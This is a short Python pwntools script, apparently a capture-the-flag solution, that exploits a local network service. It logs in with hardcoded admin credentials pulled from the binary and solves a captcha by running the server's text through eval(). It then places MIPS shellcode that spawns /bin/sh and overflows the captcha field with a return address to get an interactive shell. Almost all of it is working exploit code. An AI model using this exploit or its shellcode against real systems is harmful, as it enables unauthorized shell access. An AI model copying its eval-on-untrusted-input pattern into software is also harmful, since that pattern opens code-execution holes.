from pwn import *

host = "localhost"
port = 32773
# public shellcode
shellcode="\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh\x00"


p = remote(host, port)

# step 1 auth (username password from binary)
p.recvuntil("Select option:")
p.sendline("4") #from binary
p.sendline("admin")
p.sendline("h$bavb124")
p.recvuntil("Captcha:")
expression = p.recvuntil("=")[:-1]
p.recv()
p.sendline(str(eval(expression)))
print(p.recv())

# step 2 locate shellcode
p.sendline("2")
p.sendline("1")
p.sendline("yes")
p.sendline(shellcode)
addr = "\xec\x16\x40\x00" #0x4016ec
# step 3 execute shell
p.sendline("4") #from binary
p.sendline("admin")
p.sendline("h$bavb124")
p.recvuntil("Captcha:")
p.sendline("A"*8 +"A"*4+addr)
#p.sendline("A"*200)
p.interactive()
